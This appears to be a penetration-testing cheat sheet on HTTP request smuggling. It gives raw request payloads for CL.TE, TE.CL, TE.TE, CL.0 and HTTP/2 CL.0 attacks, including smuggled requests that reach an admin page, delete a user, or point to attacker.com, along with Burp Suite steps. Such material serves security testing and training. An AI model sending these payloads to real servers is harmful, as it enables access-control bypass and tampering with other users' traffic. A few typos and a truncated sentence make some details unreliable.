## Investigation

Assume the website has the following HTTP specification.

```bash
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
```

If we change “Content-Length” to “Transfer-Encoding” as follow, the data is sent in chunks to server. Each chunk consists of the chunk size in bytes (it is expressed in hexadecimal). 

The message is terminated with a chunk of size zero.

```bash
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

1d
username=admin&password=admin
0
```

<br />

## Exploitation Automatically

BurpSuite has the useful extension **“HTTP Request Smuggler”**.

<br />

## CL.TE (Content-Length . Transfer-Encoding)

The front-end server uses “Content-Length” header and the back-end server uses “Transfer-Encoding” header.

Send the following request twice.

```bash
POST /item HTTP/1.1
Host: example.com
Content-Length: 9
Transfer-Encoding: chunked

0

EVIL
```

If the response delays, we may be able to request smuggling.

### Exploitation

The front-end server uses the “Content-Length” header, so 

```bash
POST /item HTTP/1.1
Host: example.com
Content-Length: 9
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
Foo: xGET / HTTP/1.1
Host: example.com
```

<br />

## TE.CL (Transfer-Encoding . Content-Length)

The front-end server uses **“Trans-Encoding”** header and the back-end server uses **“Content-Length”** header.  
Send the following request twice.

If you use BurpSuite, check the **“Update Content-Length”** option is unchecked to avoid BurpSuite automatically changes the Content-Length depending on data sent.

```bash
POST  HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

4
EVIL
0
```

If the response delays, we may be able to request smuggling.

### Exploitation

Send the following request twice.

```bash
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

<br />

## TE.TE (Transfer-Encoding . Transfer-Encoding)

Both the front-end server and the back-end server support the **“Transfer-Encoding”** header but one of the servers can be induced not to process it by obfuscating the header.

```bash
Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x
```

<br />

## CL.0 (Content-Length: 0)

If the target website ignores the Content-Length, you’re able to access the restricted page by request smuggling.

### 1. Prepare the Two Same Requests

If you're using Burp Suite, send the target request to **Repeater** twice.

### 2. Change the First Request to POST Request

### 3. Set the "Content-Length: 0" in the First Request

### 4. Set the "Connection: keep-alive" in the First Request

Now two requests should look like:

```sh
# Request 1
POST / HTTP/1.1
Host: example.com
Cookie: key=value
Connection: keep-alive
Content-Length: 0

GET /admin/delete?username=john
Foo: x

# -------------------------------------------------

# Request 2
GET / HTTP/1.1
Host: example.com
Cookie: key=value
Connection: close
```

### 5. Send Requests in Order

First off, if you're using Burp Suite, note that **enabling the "Update Content-Length" in the Burp Repeater option.**
The sequence is Request 1 -> Request 2.

<br />

## HTTP/2 CL.0 (Content-Length: 0)

### 1. Prepare Request

If you're using Burp Suite, note that **disable "Update Content-Length" and enable "Allow HTTP/2 ALPN override" in the Burp Repeater option.**

The request shoud look like:

```sh
POST / HTTP/2
Host: example.com
Content-Length: 0

GET /exploit HTTP/1.1
Host: attacker.com
Content-Length: 5

x=1
```

### 2. Send Request

Before doing, don't forget to **expand the Inspector on the right in the Repeater and select "HTTP/2".**  
Now send the request a few times.
